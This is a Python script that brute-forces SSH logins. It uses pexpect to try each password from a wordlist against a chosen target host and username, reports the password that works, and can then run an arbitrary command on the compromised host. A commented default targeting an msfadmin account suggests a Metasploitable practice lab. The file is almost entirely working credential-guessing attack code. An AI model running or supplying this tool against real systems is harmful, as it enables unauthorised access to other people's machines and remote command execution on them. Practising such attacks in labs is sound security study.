import pexpect
import optparse
from termcolor import colored

PROMPT = ['# ', '>>> ', '> ', '\$ ']

# Print the command output
def get_hostname(connection, command, user):
    connection.sendline(command)
    connection.expect(PROMPT)
    result = str(connection.before).strip("b'{\}rn")
    result = result.replace(r'\r', '')
    result = result.replace(r'\t', '')
    result = result.replace(r'\n', '')
    result = result.replace(command, '')
    result = result.replace(user, '')
    hostName = ""
    for letter in result:
        if letter == '@':
            break
        else:
            hostName += letter
    return hostName

def send_command(connection, command, user, hostName):
    connection.sendline(command)
    connection.expect(PROMPT)
    result = str(connection.before).strip("b'{\}rn")
    result = result.replace(r'\r', '')
    result = result.replace(r'\t', '')
    result = result.replace(r'\n', '')
    result = result.replace(command, '')
    result = result.replace(user, '')
    result = result.replace('@' + hostName + ':~', '')
    print(result)



def connect(user, host, password):
    ssh_newkey = 'Are you sure you want to continue connecting'
    connStr = 'ssh ' + user + '@' + host
    connPass = "%s@%s's password: " % (user, host)
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, connPass])
    if ret == 0:
        print('[-] Error Connecting')
        return
    if ret == 1:
        child.sendline("yes")
        ret = child.expect([pexpect.TIMEOUT, connPass])
        if ret == 0:
            print('[-] Error Connecting')
            return
        if ret == 1:
            child.sendline(password)
            # chilsd.expect(PROMPT)
            return child
    if ret == 2:
        child.sendline(password)
        child.expect(PROMPT, timeout=0.1)
        return child


def main():
    parser = optparse.OptionParser(
        'Usage of program: ' + '-H <target host> -u <targets username> -f <passwords file path> -c <command to execute>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-u', dest='tgtUser', type='string', help='specify target username')
    parser.add_option('-f', dest='tgtPassFile', type='string', help='specify passwords file path')
    parser.add_option('-c', dest='tgtCommand', type='string', help='specify command to execute on host')
    (options, args) = parser.parse_args()

    # Set arguments
    host = options.tgtHost
    user = options.tgtUser
    file = open(options.tgtPassFile, 'r')
    command = options.tgtCommand

    # Arguments validation
    if (host == None) and (user == None) and (file == None) and (command == None):
        print(parser.usage)
        exit(0)
    elif (host == None) or (user == None) or (file == None):
        parser.print_help()
        exit(0)

    # host = "10.0.0.8"
    # user = "msfadmin"
    # file = open('./passwords.txt', 'r')

    if command == None:
        for password in file.readlines():
            password = password.strip('\n')
            try:
                child = connect(user, host, password)
                print(colored('[+] Password found:' + password, 'green'))
                break

            except:

                print('[-] Wrong password:' + password)

    else:
        for password in file.readlines():
            password = password.strip('\n')
            try:
                child = connect(user, host, password)
                print(colored('[+] Password found:' + password, 'green'))
                hostName = get_hostname(child, 'hostname', user)
                send_command(child, command, user, hostName)
                break

            except:

                print('[-] Wrong password:' + password)


main()
